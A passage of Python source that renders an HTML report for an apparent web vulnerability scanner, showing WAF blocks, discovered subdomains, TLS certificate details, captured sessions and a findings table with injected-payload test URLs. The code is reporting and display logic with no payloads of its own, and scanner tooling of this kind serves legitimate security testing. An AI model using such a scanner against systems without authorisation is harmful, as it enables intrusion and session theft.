        counters = next((x for x in _counters_raw if isinstance(x, dict)), {})
    elif isinstance(_counters_raw, dict):
        counters = _counters_raw
    else:
        counters = {}
    total_req = counters.get("total", 0)
    ok_2xx = counters.get("2xx", 0)
    block_403 = counters.get("403", 0)
    rate_429 = counters.get("429", 0)

    # Calculate "Successful" in terms of exploits (Severity > Low) vs "Failed" attempts
    exploit_count = stats["Critical"] + stats["High"] + stats["Medium"]

    traffic_html = f"""
    <div class="card" style="background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:1.5rem; margin-bottom:2rem;">
        <h3 style="margin-top:0;">[signal] Attack Traffic & Efficiency</h3>
        <div class="stats-grid" style="grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); margin-bottom:0;">
            <div class="stat-card" style="padding:1rem;">
                <span class="stat-value" style="font-size:1.5rem; color:var(--text-main)">{total_req}</span>
                <span class="stat-label">Total Requests</span>
            </div>
            <div class="stat-card" style="padding:1rem;">
                <span class="stat-value" style="font-size:1.5rem; color:var(--sev-low)">{ok_2xx}</span>
                <span class="stat-label">2xx (Passed)</span>
            </div>
             <div class="stat-card" style="padding:1rem;">
                <span class="stat-value" style="font-size:1.5rem; color:var(--sev-high)">{block_403}</span>
                <span class="stat-label">403 (WAF Block)</span>
            </div>
             <div class="stat-card" style="padding:1rem;">
                <span class="stat-value" style="font-size:1.5rem; color:var(--sev-medium)">{rate_429}</span>
                <span class="stat-label">429 (Rate Limit)</span>
            </div>
            <div class="stat-card" style="padding:1rem; border-color:var(--accent);">
                <span class="stat-value" style="font-size:1.5rem; color:var(--accent)">{exploit_count}</span>
                <span class="stat-label">Confirmed Exploits</span>
            </div>
            <div class="stat-card" style="padding:1rem; border-color:{waf_badge_color};">
                <span class="stat-value" style="font-size:1rem; color:{waf_badge_color}; word-break:break-word">{waf_label}</span>
                <span class="stat-label">WAF Detected</span>
            </div>
        </div>
    </div>
    """

    # --- Subdomain / Domain Info ---
    subdomain_html = ""
    subdomains = set()
    # 1. Collect subdomains from evidence dicts in passive/discovery/final buckets
    for bucket in ("passive", "discovery", "final"):
        for item in (results.get(bucket) or []):
            if not isinstance(item, dict): continue
            _ev_raw = item.get("evidence")
            ev = _ev_raw if isinstance(_ev_raw, dict) else {}
            subs = ev.get("subdomains") or []
            subdomains.update(subs)
    # 2. Collect from dedicated "subdomains" bucket (from _runner_subdomain)
    for item in (results.get("subdomains") or []):
        if isinstance(item, str):
            subdomains.add(item)
        elif isinstance(item, dict):
            sub = item.get("subdomain") or item.get("host") or item.get("url") or item.get("value") or item.get("name")
            if sub:
                subdomains.add(str(sub))
            _ev2 = item.get("evidence")
            _ev2 = _ev2 if isinstance(_ev2, dict) else {}
            for s in (_ev2.get("subdomains") or []):
                subdomains.add(str(s))
    if subdomains:
        sub_rows = "".join(
            f"<tr><td style='font-family:monospace; color:var(--accent)'>{_escape(s)}</td></tr>"
            for s in sorted(subdomains)
        )
        subdomain_html = f"""
        <div class="card" style="background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:1.5rem; margin-bottom:2rem;">
            <h3 style="margin-top:0;">[globe] Discovered Subdomains ({len(subdomains)})</h3>
            <div class="table-container">
                <table>
                    <thead><tr><th>Subdomain</th></tr></thead>
                    <tbody>{sub_rows}</tbody>
                </table>
            </div>
        </div>
        """

    # --- SSL Data Prep ---
    ssl_html = ""
    tls_raw = results.get("tls") or {}
    # tls may be a list (from add_result) or a single dict
    if isinstance(tls_raw, list):
        tls_data = next((x for x in tls_raw if isinstance(x, dict) and "certificate" in x), {})
    else:
        tls_data = tls_raw
    cert = tls_data.get("certificate") or {}

    # -------------------------------------------------------------------
    # Fallback: build cert dict from nmap ssl-cert script output when the
    # tls results bucket has no "certificate" key (common when only nmap
    # ran and the dedicated TLS scanner was skipped / timed out).
    # nmap_data is already normalised a few hundred lines above.
    # -------------------------------------------------------------------
    if not cert and isinstance(nmap_data, list):
        for _np in nmap_data:
            if not isinstance(_np, dict):
                continue
            _scripts = _np.get("scripts") or {}
            _ssl_text = _scripts.get("ssl-cert") or ""
            if not _ssl_text:
                continue
            _nc = _parse_nmap_ssl_cert(_ssl_text)
            if not _nc:
                continue
            cert = _nc
            # Augment with TLS version from ssl-enum-ciphers (first TLSvX.Y line)
            _enum_text = _scripts.get("ssl-enum-ciphers") or ""
            for _el in _enum_text.splitlines():
                if re.match(r"\s*TLSv[0-9.]+\s*:", _el):
                    cert.setdefault("tls_version", _el.strip().rstrip(":"))
                    break
            break  # use first port that has ssl-cert (usually 443)

    if cert:
        valid_icon = "[OK] Valid" if cert.get("valid") else "[X] Invalid"
        if cert.get("self_signed"):
            valid_icon = "[!] Self-Signed"

        probs = cert.get("problems") or []
        probs_html = (
            "<br><span style='color:var(--sev-critical)'>" + "<br>".join(_escape(p) for p in probs) + "</span>"
            if probs else ""
        )

        warnings = cert.get("warnings") or []
        warnings_html = (
            "<br><span style='color:var(--sev-high)'>" + "<br>".join(_escape(w) for w in warnings) + "</span>"
            if warnings else ""
        )

        days = cert.get("days_remaining")
        expiry_color = "var(--sev-critical)" if isinstance(days, int) and days < 0 else (
            "var(--sev-high)" if isinstance(days, int) and days < 30 else "var(--text-main)"
        )
        days_label = f"{days} days" if isinstance(days, int) else "-"

        # SAN (Subject Alternative Names = domain/subdomain list)
        san_list = cert.get("san") or []
        san_html = ""
        if san_list:
            san_items = "".join(
                f"<span style='display:inline-block; background:var(--bg-body); border:1px solid var(--border); "
                f"border-radius:3px; padding:2px 8px; margin:2px; font-family:monospace; font-size:0.85rem;'>"
                f"{_escape(s)}</span>"
                for s in san_list
            )
            san_html = f"<div class='label'>Alt Names (SAN)</div><div>{san_items}</div>"

        hsts_icon = "[OK]" if (cert.get("hsts") or tls_data.get("hsts")) else "[X]"

        ssl_html = f"""
        <div class="card" style="background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:1.5rem; margin-bottom:2rem;">
            <h3 style="margin-top:0;">[lock] SSL/TLS Certificate</h3>
            <div class="kv-grid" style="grid-template-columns: 200px 1fr; gap:0.5rem; margin-bottom:0;">
                <div class="label">Status</div>     <div>{valid_icon} {probs_html}{warnings_html}</div>
                <div class="label">HSTS</div>        <div>{hsts_icon} Strict-Transport-Security</div>
                <div class="label">Subject CN</div>  <div><code>{_escape(cert.get('subject_CN') or '-')}</code></div>
                <div class="label">Issuer</div>      <div>{_escape(cert.get('issuer_CN') or '-')} ({_escape(cert.get('issuer_O') or '-')})</div>
                <div class="label">Validity</div>    <div>{_escape(str(cert.get('not_before') or ''))} &mdash; {_escape(str(cert.get('not_after') or ''))}</div>
                <div class="label">Expires In</div>  <div style="color:{expiry_color}"><strong>{days_label}</strong></div>
                <div class="label">Protocol</div>    <div>{_escape(cert.get('tls_version') or '-')}</div>
                <div class="label">Fingerprint</div> <div style="font-family:monospace; font-size:0.82rem; word-break:break-all;">{_escape(cert.get('fingerprint') or '-')}</div>
                {san_html}
            </div>
        </div>
        """

    # --- Phase Errors Section ---
    phase_errors_html = ""
    phase_errors = [e for e in (results.get("phase_error") or []) if isinstance(e, dict)]
    if phase_errors:
        def _safe_meta(e):
            m = e.get("meta")
            return m if isinstance(m, dict) else {}
        err_rows = "".join(
            f"<tr>"
            f"<td style='font-family:monospace; color:var(--sev-high)'>{_escape(_safe_meta(e).get('phase') or e.get('type', '-'))}</td>"
            f"<td style='color:var(--sev-medium)'>{_escape(_safe_meta(e).get('exc_type', ''))}</td>"
            f"<td style='font-size:0.85rem; color:var(--text-muted)'>{_escape(e.get('message', ''))}</td>"
            f"</tr>"
            for e in phase_errors
        )
        phase_errors_html = f"""
        <div class="card" style="background:rgba(210,153,34,0.07); border:1px solid var(--sev-high); border-radius:6px; padding:1.5rem; margin-bottom:2rem;">
            <h3 style="margin-top:0; color:var(--sev-high);">[!] Scan Phase Errors ({len(phase_errors)})</h3>
            <p style="color:var(--text-muted); font-size:0.9rem; margin-bottom:1rem;">Some scan phases encountered errors. Results from these phases may be incomplete.</p>
            <div class="table-container">
                <table>
                    <thead><tr><th>Phase</th><th>Error Type</th><th>Message</th></tr></thead>
                    <tbody>{err_rows}</tbody>
                </table>
            </div>
        </div>
        """

    # --- Sessions Data Prep ---
    sessions = results.get("sessions") or []
    sessions_json = json.dumps(sessions, default=str).replace("<", "\\u003c").replace(">", "\\u003e")

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSecure Report - { _escape(target) }</title>
    <style>
        :root {{
            --bg-body: #0d1117;
            --bg-card: #161b22;
            --bg-header: #010409;
            --border: #30363d;
            --text-main: #c9d1d9;
            --text-muted: #8b949e;
            --accent: #58a6ff;
            --sev-critical: #da3633;
            --sev-high: #d29922;
            --sev-medium: #db6d28; /* Orange-ish */
            --sev-low: #3fb950;
            --sev-info: #8b949e;
        }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            background-color: var(--bg-body);
            color: var(--text-main);
            margin: 0;
            padding: 0;
            line-height: 1.5;
        }}
        header {{
            background: var(--bg-header);
            border-bottom: 1px solid var(--border);
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }}
        h1 {{ margin: 0; font-size: 1.5rem; color: var(--text-main); display: flex; align-items: center; gap: 10px; }}
        .header-meta {{ font-size: 0.9rem; color: var(--text-muted); text-align: right; }}

        .container {{ max-width: 1400px; margin: 0 auto; padding: 2rem; }}

        /* Stats Cards */
        .stats-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 1rem;
            margin-bottom: 2rem;
        }}
        .stat-card {{
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 1.5rem;
            text-align: center;
        }}
        .stat-value {{ font-size: 2rem; font-weight: bold; display: block; }}
        .stat-label {{ font-size: 0.9rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }}

        .c-critical {{ color: var(--sev-critical); }}
        .c-high {{ color: var(--sev-high); }}
        .c-medium {{ color: var(--sev-medium); }}
        .c-low {{ color: var(--sev-low); }}
        .c-info {{ color: var(--sev-info); }}

        /* Charts */
        .gallery {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }}
        .chart-card {{
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 1rem;
            text-align: center;
        }}
        .chart-card img {{ max-width: 100%; height: auto; border-radius: 4px; }}

        /* Table Controls */
        .controls {{
            display: flex;
            gap: 1rem;
            margin-bottom: 1rem;
        }}
        input.search {{
            background: var(--bg-header);
            border: 1px solid var(--border);
            color: var(--text-main);
            padding: 0.5rem 1rem;
            border-radius: 6px;
            flex: 1;
            font-size: 1rem;
        }}

        .btn {{
            background: var(--accent);
            color: #000;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
        }}
        .btn:hover {{ opacity: 0.9; }}

        /* Data Table */
        .table-container {{
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 6px;
            overflow: hidden;
        }}
        table {{ width: 100%; border-collapse: collapse; text-align: left; }}
        th {{
            background: var(--bg-header);
            padding: 0.75rem 1rem;
            font-weight: 600;
            border-bottom: 1px solid var(--border);
            color: var(--text-muted);
        }}
        td {{ padding: 0.75rem 1rem; border-bottom: 1px solid var(--border); }}
        tr:last-child td {{ border-bottom: none; }}
        tr:hover td {{ background: rgba(255,255,255,0.02); }}

        .tag {{
            display: inline-block;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 0.75rem;
            font-weight: 600;
            border: 1px solid transparent;
        }}
        .tag.Critical {{ border-color: var(--sev-critical); color: var(--sev-critical); background: rgba(218,54,51,0.1); }}
        .tag.High {{ border-color: var(--sev-high); color: var(--sev-high); background: rgba(210,153,34,0.1); }}
        .tag.Medium {{ border-color: var(--sev-medium); color: var(--sev-medium); background: rgba(219,109,40,0.1); }}
        .tag.Low {{ border-color: var(--sev-low); color: var(--sev-low); background: rgba(63,185,80,0.1); }}
        .tag.Info {{ border-color: var(--sev-info); color: var(--sev-info); background: rgba(139,148,158,0.1); }}

        .method {{ font-family: monospace; color: var(--text-muted); }}
        .url {{ font-family: monospace; word-break: break-all; color: var(--accent); }}

        /* Modal / Detail View */
        .modal {{
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0; top: 0; width: 100%; height: 100%;
            background-color: rgba(0,0,0,0.8);
            backdrop-filter: blur(2px);
        }}
        .modal-content {{
            background-color: var(--bg-card);
            margin: 5% auto;
            border: 1px solid var(--border);
            border-radius: 8px;
            width: 80%;
            max-width: 900px;
            max-height: 85vh;
            overflow-y: auto;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }}
        .modal-header {{
            padding: 1.5rem;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--bg-header);
        }}
        .modal-body {{ padding: 2rem; }}
        .close {{ font-size: 1.5rem; cursor: pointer; color: var(--text-muted); }}
        .close:hover {{ color: var(--text-main); }}

        pre {{
            background: #0d1117;
            padding: 1rem;
            border-radius: 6px;
            border: 1px solid var(--border);
            overflow-x: auto;
            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
        }}
        .kv-grid {{
            display: grid;
            grid-template-columns: 150px 1fr;
            gap: 1rem;
            margin-bottom: 2rem;
        }}
        .label {{ color: var(--text-muted); font-weight: 600; }}

    </style>
</head>
<body>

<header>
    <div>
        <h1>[shield] WebSecure Report</h1>
    </div>
    <div style="display:flex; gap:10px; align-items:center;">
        <button class="btn" onclick="showSessions()">[key] Captured Sessions ({len(sessions)})</button>
        <div class="header-meta">
            <div>Target: <strong>{ _escape(target) }</strong> <span style="font-family:monospace; color:var(--accent)">[{_escape(target_ip)}]</span></div>
            <div>Date: { scan_date }</div>
        </div>
    </div>
</header>

<div class="container">

    <!-- Executive Summary — click any card to filter findings table -->
    <div class="stats-grid">
        <div class="stat-card" id="card-Critical" style="cursor:pointer; transition:border-color 0.15s;" onclick="filterBySeverity('Critical')" title="Click to filter Critical findings">
            <span class="stat-value c-critical">{ stats["Critical"] }</span>
            <span class="stat-label">Critical</span>
        </div>
        <div class="stat-card" id="card-High" style="cursor:pointer; transition:border-color 0.15s;" onclick="filterBySeverity('High')" title="Click to filter High findings">
            <span class="stat-value c-high">{ stats["High"] }</span>
            <span class="stat-label">High</span>
        </div>
        <div class="stat-card" id="card-Medium" style="cursor:pointer; transition:border-color 0.15s;" onclick="filterBySeverity('Medium')" title="Click to filter Medium findings">
            <span class="stat-value c-medium">{ stats["Medium"] }</span>
            <span class="stat-label">Medium</span>
        </div>
        <div class="stat-card" id="card-Low" style="cursor:pointer; transition:border-color 0.15s;" onclick="filterBySeverity('Low')" title="Click to filter Low findings">
            <span class="stat-value c-low">{ stats["Low"] }</span>
            <span class="stat-label">Low</span>
        </div>
        <div class="stat-card" id="card-All" style="cursor:pointer; transition:border-color 0.15s;" onclick="filterBySeverity('')" title="Show all findings">
             <span class="stat-value">{ total_issues }</span>
             <span class="stat-label">All Findings</span>
        </div>
    </div>

    <!-- Charts -->
    { charts_html }

    <!-- Network & SSL Info -->
    { ssl_html }
    { subdomain_html }
    { ports_html }
    { traffic_html }

    <!-- JS & File Analysis -->
    { js_files_html }
    { files_html }

    <!-- httpx + katana -->
    { httpx_html }
    { katana_html }

    <!-- Remediation Priority Matrix -->
    { remediation_html }

    <!-- Phase Errors -->
    { phase_errors_html }

    <!-- Findings Table -->
    <h2>[search] Findings ({total_issues} total)</h2>
    <div class="controls">
        <input type="text" id="searchInput" class="search" placeholder="Filter by URL, type, param, severity..." oninput="applyFilters()">
        <select id="sevFilter" onchange="applyFilters()" style="background:var(--bg-header); border:1px solid var(--border); color:var(--text-main); padding:0.5rem 1rem; border-radius:6px;">
            <option value="">All Severities</option>
            <option value="Critical">Critical</option>
            <option value="High">High</option>
            <option value="Medium">Medium</option>
            <option value="Low">Low</option>
            <option value="Info">Info</option>
        </select>
        <button class="btn" onclick="filterBySeverity('')" title="Clear all filters">&#x2715; Clear</button>
    </div>

    <div class="table-container">
        <table id="findingsTable">
            <thead>
                <tr>
                    <th width="90">Severity</th>
                    <th width="180">Type</th>
                    <th>URL / Risk Location</th>
                    <th width="80">Method</th>
                    <th width="120">Parameter</th>
                    <th width="80">Status</th>
                </tr>
            </thead>
            <tbody id="tableBody">
                <!-- JS will populate this -->
            </tbody>
        </table>
    </div>

</div>

<!-- Detail Modal -->
<div id="detailModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2 id="modalTitle">Finding Detail</h2>
            <span class="close" onclick="closeModal('detailModal')">&times;</span>
        </div>
        <div class="modal-body" id="modalBody">
            <!-- Content -->
        </div>
    </div>
</div>

<!-- Sessions Modal -->
<div id="sessionsModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <h2>[key] Captured Sessions</h2>
            <span class="close" onclick="closeModal('sessionsModal')">&times;</span>
        </div>
        <div class="modal-body" id="sessionsBody">
            <!-- Populated by JS -->
        </div>
    </div>
</div>

<script>
    // -----------------------------------------------------------------------
    // Data — JSON-encoded by Python; safe unicode escapes for < >
    // -----------------------------------------------------------------------
    var data = [];
    var sessions = [];
    try {{
        data = { findings_json };
    }} catch(e) {{
        console.error('[WebSecure] Failed to parse findings data ({_data_size_kb} KB):', e);
        // Show a visible error so the user knows why the table is empty
        (function() {{
            var tb = document.getElementById('tableBody');
            if (tb) {{
                tb.innerHTML = '<tr><td colspan="6" style="color:var(--sev-critical);padding:1.5rem;text-align:center;">'
                    + '&#9888; Findings data parse error ({_data_size_kb} KB inline). '
                    + 'Open browser DevTools (F12 &rarr; Console) for details.</td></tr>';
            }}
        }})();
    }}
    try {{
        sessions = { sessions_json };
    }} catch(e) {{
        console.error('[WebSecure] Failed to parse sessions data:', e);
    }}

    // -----------------------------------------------------------------------
    // Table rendering
    // -----------------------------------------------------------------------
    function renderTable(items) {{
        var tbody = document.getElementById('tableBody');
        if (!tbody) return;
        tbody.innerHTML = '';
        if (!items || items.length === 0) {{
            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:var(--text-muted); padding:2rem;">No findings match the current filter.</td></tr>';
            return;
        }}
        // Render in chunks to avoid blocking the UI on large datasets
        var fragment = document.createDocumentFragment();
        items.forEach(function(item) {{
            try {{
                var tr = document.createElement('tr');
                tr.style.cursor = 'pointer';
                tr.onclick = function() {{ showDetail(item.id); }};
                var sevClass = item.severity || 'Info';
                var paramBadge = item.param && item.param !== '-'
                    ? '<br><span style="font-size:0.78rem; color:var(--text-muted);">param: <code style="color:var(--sev-high)">' + escapeHtml(item.param) + '</code></span>'
                    : '';
                var urlHtml = item.url && item.url !== '-'
                    ? '<a href="' + escapeHtml(item.url) + '" target="_blank" rel="noopener noreferrer" onclick="event.stopPropagation()" style="color:var(--accent);text-decoration:none;" title="' + escapeHtml(item.url) + '">' + escapeHtml(item.url) + '</a>'
                    : escapeHtml(item.url || '-');
                // CWE badge — detail nesnesinden çek
                var _det = item.detail || {{}};
                var _cweArr = (_det.cwe_ids && _det.cwe_ids.length) ? _det.cwe_ids
                            : (_det.evidence && _det.evidence.cwe && _det.evidence.cwe.length) ? _det.evidence.cwe
                            : [];
                var cweBadge = _cweArr.length
                    ? ' <span style="font-size:0.72rem; color:var(--accent); background:rgba(88,166,255,0.1); border:1px solid rgba(88,166,255,0.25); border-radius:3px; padding:1px 5px; vertical-align:middle;">' + escapeHtml(String(_cweArr[0])) + '</span>'
                    : '';
                var cvssVal = _det.cvss_score || (_det.evidence && _det.evidence.cvss);
                var cvssBadge = cvssVal
                    ? ' <span style="font-size:0.72rem; font-weight:700; color:' + (parseFloat(cvssVal)>=9?'var(--sev-critical)':parseFloat(cvssVal)>=7?'var(--sev-high)':parseFloat(cvssVal)>=4?'var(--sev-medium)':'var(--sev-low)') + '; vertical-align:middle;">' + parseFloat(cvssVal).toFixed(1) + '</span>'
                    : '';
                tr.innerHTML =
                    '<td><span class="tag ' + escapeHtml(sevClass) + '">' + escapeHtml(sevClass) + '</span></td>' +
                    '<td style="font-weight:500">' + escapeHtml(item.type) + cweBadge + cvssBadge + '</td>' +
                    '<td class="url">' + urlHtml + paramBadge + '</td>' +
                    '<td class="method">' + escapeHtml(item.method) + '</td>' +
                    '<td><code style="font-size:0.85rem">' + escapeHtml(item.param) + '</code></td>' +
                    '<td><span class="tag Info">Open</span></td>';
                fragment.appendChild(tr);
            }} catch(e) {{
                console.warn('[WebSecure] renderTable row error:', e, item);
            }}
        }});
        tbody.appendChild(fragment);
    }}

    // -----------------------------------------------------------------------
    // Filter + search
    // -----------------------------------------------------------------------
    function applyFilters() {{
        try {{
            var searchEl = document.getElementById('searchInput');
            var sevEl    = document.getElementById('sevFilter');
            var term = searchEl ? searchEl.value.toLowerCase() : '';
            var sev  = sevEl   ? sevEl.value : '';
            var filtered = data.filter(function(item) {{
                var d = item.detail || {{}};
                var matchText = !term ||
                    (item.url      && item.url.toLowerCase().includes(term))      ||
                    (item.type     && item.type.toLowerCase().includes(term))     ||
                    (item.param    && item.param.toLowerCase().includes(term))    ||
                    (item.severity && item.severity.toLowerCase().includes(term)) ||
                    (item.method   && item.method.toLowerCase().includes(term))   ||
                    (d.payload     && String(d.payload).toLowerCase().includes(term))   ||
                    (d.reason      && String(d.reason).toLowerCase().includes(term))    ||
                    (d.message     && String(d.message).toLowerCase().includes(term))   ||
                    (d.type        && String(d.type).toLowerCase().includes(term));
                var matchSev = !sev || item.severity === sev;
                return matchText && matchSev;
            }});
            renderTable(filtered);

            // Highlight active severity stat card
            var sevColors = {{
                'Critical': 'var(--sev-critical)',
                'High':     'var(--sev-high)',
                'Medium':   'var(--sev-medium)',
                'Low':      'var(--sev-low)',
                '':         'var(--border)'
            }};
            ['Critical','High','Medium','Low','All'].forEach(function(s) {{
                var card = document.getElementById('card-' + (s === '' ? 'All' : s));
                if (!card) return;
                var activeSev = s === 'All' ? '' : s;
                if (activeSev === sev) {{
                    card.style.borderColor = sevColors[sev] || 'var(--accent)';
                    card.style.boxShadow   = '0 0 0 2px ' + (sevColors[sev] || 'var(--accent)');
                }} else {{
                    card.style.borderColor = 'var(--border)';
                    card.style.boxShadow   = 'none';
                }}
            }});
        }} catch(e) {{
            console.error('[WebSecure] applyFilters error:', e);
        }}
    }}

    function filterBySeverity(sev) {{
        var sevEl   = document.getElementById('sevFilter');
        var searchEl = document.getElementById('searchInput');
        if (sevEl)   sevEl.value   = sev;
        if (searchEl) searchEl.value = '';
        applyFilters();
        var tbl = document.getElementById('findingsTable');
        if (tbl) tbl.scrollIntoView({{behavior: 'smooth', block: 'start'}});
    }}

    function filterByType(vtype) {{
        // vtype arrives as a plain string (JSON-decoded by JS engine from onclick attr)
        var searchEl = document.getElementById('searchInput');
        var sevEl    = document.getElementById('sevFilter');
        // Strip "(bucket)" suffix if present: "SQL Injection (sqli)" → "SQL Injection"
        var cleanType = (vtype || '').split(' (')[0].trim();
        if (searchEl) searchEl.value = cleanType;
        if (sevEl)    sevEl.value    = '';   // clear severity filter when filtering by type
        applyFilters();
        var tbl = document.getElementById('findingsTable');
        if (tbl) tbl.scrollIntoView({{behavior: 'smooth', block: 'start'}});
    }}

    function showDetail(id) {{
        const item = data.find(i => i.id === id);
        if(!item) return;

        const d = item.detail;
        const modal = document.getElementById('detailModal');
        document.getElementById('modalTitle').innerText = item.type;

        // --- 1. Temel bilgiler ---
        const verified = d.verified || d.confirmed;
        const confidence = d.confidence || d.score;
        const tool = d.tool || d.scanner || d.source;
        const verBadge = verified
            ? `<span style="background:rgba(63,185,80,0.15); border:1px solid var(--sev-low); color:var(--sev-low); border-radius:4px; padding:2px 8px; font-size:0.8rem; font-weight:600;">✓ Verified</span>`
            : `<span style="background:rgba(139,148,158,0.1); border:1px solid var(--text-muted); color:var(--text-muted); border-radius:4px; padding:2px 8px; font-size:0.8rem;">Unverified</span>`;

        // Build test URL (original URL + injected payload in param) for display only
        var testUrlHtml = '';
        var cleanUrl = item.url || '';
        var payloadVal0 = d.payload || d.poc || '';
        var paramVal0 = item.param && item.param !== '-' ? item.param : (d.parameter || '');
        if (cleanUrl && paramVal0 && payloadVal0 && typeof payloadVal0 === 'string') {{
            try {{
                var _tu = new URL(cleanUrl);
                _tu.searchParams.set(paramVal0, payloadVal0);
                var _testStr = _tu.toString();
                testUrlHtml = `<div class="label" style="color:var(--sev-medium); font-size:0.78rem;">Test URL</div>`
                    + `<div style="font-size:0.82rem; word-break:break-all; color:var(--text-muted);">`
                    + `<code style="background:rgba(139,148,158,0.1); padding:2px 4px; border-radius:3px;">`
                    + escapeHtml(_testStr.substring(0,400)) + (_testStr.length > 400 ? '…' : '')
                    + `</code> <span style="font-size:0.75rem; color:var(--text-muted)">(payload enjekte edildi — tarayıcıda çalışmayabilir)</span></div>`;
            }} catch(e) {{}}
        }}

        let html = `
            <div class="kv-grid">
                <div class="label">Target URL</div> <div><a href="${{escapeHtml(cleanUrl)}}" target="_blank" style="color:var(--accent)">${{escapeHtml(cleanUrl)}}</a></div>
                ${{testUrlHtml}}
                <div class="label">Method</div> <div><code>${{escapeHtml(item.method)}}</code></div>
                <div class="label">Severity</div> <div><span class="tag ${{item.severity}}">${{item.severity}}</span> ${{verBadge}}</div>
                ${{d.location ? `<div class="label">Location</div> <div>${{escapeHtml(d.location)}}</div>` : ''}}
                ${{paramVal0 ? `<div class="label">Parameter</div> <div><code style="color:var(--sev-high)">${{escapeHtml(paramVal0)}}</code></div>` : ''}}
                ${{confidence ? `<div class="label">Confidence</div> <div>${{escapeHtml(String(confidence))}}</div>` : ''}}
                ${{tool ? `<div class="label">Scanner</div> <div><code>${{escapeHtml(tool)}}</code></div>` : ''}}
            </div>
        `;

        // --- 1b. CWE / CVSS / CVE Sınıflandırma Bloğu ---
        const cweList = (d.cwe_ids && d.cwe_ids.length) ? d.cwe_ids
                      : (d.evidence && d.evidence.cwe && d.evidence.cwe.length) ? d.evidence.cwe
                      : [];
        const cveList = (d.cve_ids && d.cve_ids.length) ? d.cve_ids
                      : (d.evidence && d.evidence.cve && d.evidence.cve.length) ? d.evidence.cve
                      : [];
        const cvssScore  = d.cvss_score  || (d.evidence && d.evidence.cvss);
        const cvssVector = d.cvss_vector || '';
        if (cweList.length || cveList.length || cvssScore) {{
            html += `<div style="background:rgba(48,54,61,0.6); border:1px solid var(--border); border-radius:6px; padding:10px 14px; margin:10px 0; display:flex; flex-wrap:wrap; gap:12px; align-items:center;">`;
            if (cweList.length) {{
                cweList.forEach(cwe => {{
                    const cweId = String(cwe).replace(/^CWE-/i,'');
                    html += `<a href="https://cwe.mitre.org/data/definitions/${{cweId}}.html" target="_blank"
                               style="display:inline-flex; align-items:center; gap:4px; background:rgba(88,166,255,0.12);
                                      border:1px solid rgba(88,166,255,0.35); border-radius:4px; padding:3px 8px;
                                      color:var(--accent); font-size:0.82rem; font-weight:600; text-decoration:none;"
                               title="View ${{escapeHtml(String(cwe))}} on MITRE">
                               🔗 ${{escapeHtml(String(cwe))}}
                             </a>`;
                }});
            }}
            if (cveList.length) {{
                cveList.forEach(cve => {{
                    html += `<a href="https://nvd.nist.gov/vuln/detail/${{escapeHtml(String(cve))}}" target="_blank"
                               style="display:inline-flex; align-items:center; gap:4px; background:rgba(248,81,73,0.12);
                                      border:1px solid rgba(248,81,73,0.35); border-radius:4px; padding:3px 8px;
                                      color:var(--sev-high); font-size:0.82rem; font-weight:600; text-decoration:none;"
                               title="View ${{escapeHtml(String(cve))}} on NVD">
                               🔗 ${{escapeHtml(String(cve))}}
                             </a>`;
                }});
            }}
            if (cvssScore) {{
                const score = parseFloat(cvssScore);
                const scoreColor = score >= 9 ? 'var(--sev-critical)' : score >= 7 ? 'var(--sev-high)' : score >= 4 ? 'var(--sev-medium)' : 'var(--sev-low)';
                html += `<span style="font-size:0.82rem; font-weight:700; color:${{scoreColor}}; background:rgba(0,0,0,0.3); border-radius:4px; padding:3px 8px; border:1px solid ${{scoreColor}}40;">
                           CVSS ${{score.toFixed(1)}}
                         </span>`;
                if (cvssVector) {{
                    html += `<span style="font-size:0.75rem; color:var(--text-muted); font-family:monospace;">${{escapeHtml(cvssVector)}}</span>`;
                }}
            }}
            html += `</div>`;
        }}

        // --- 2. Teknik / Saldırı Detayı ---
        const technique = d.technique || d.attack_type || d.attack || d.vector || d.category;
        const scriptName = d.script || d.script_name || d.template;
        const wafBypass  = d.waf_bypass || d.bypass_technique || d.encoding;
        if (technique || scriptName || wafBypass) {{
            html += `<div style="background:rgba(88,166,255,0.07); border:1px solid rgba(88,166,255,0.3); border-radius:6px; padding:12px; margin:12px 0;">`;
            html += `<div style="font-weight:600; color:var(--accent); margin-bottom:8px;">⚡ Attack Technique</div>`;
            html += `<div class="kv-grid" style="margin:0;">`;
            if(technique)   html += `<div class="label">Technique</div><div><code style="color:var(--sev-high)">${{escapeHtml(technique)}}</code></div>`;
            if(scriptName)  html += `<div class="label">Script / Template</div><div><code>${{escapeHtml(scriptName)}}</code></div>`;
            if(wafBypass)   html += `<div class="label">WAF Bypass</div><div><code>${{escapeHtml(wafBypass)}}</code></div>`;
            html += `</div></div>`;
        }}

        // --- 3. Payload / PoC ---
        const payloadVal = d.payload || d.poc;
        if (payloadVal) {{
            const payStr = typeof payloadVal === 'object' ? JSON.stringify(payloadVal, null, 2) : String(payloadVal);
            html += `<div style="margin:12px 0;">`;
            html += `<div style="font-weight:600; color:var(--sev-high); margin-bottom:6px;">💉 Payload / PoC</div>`;
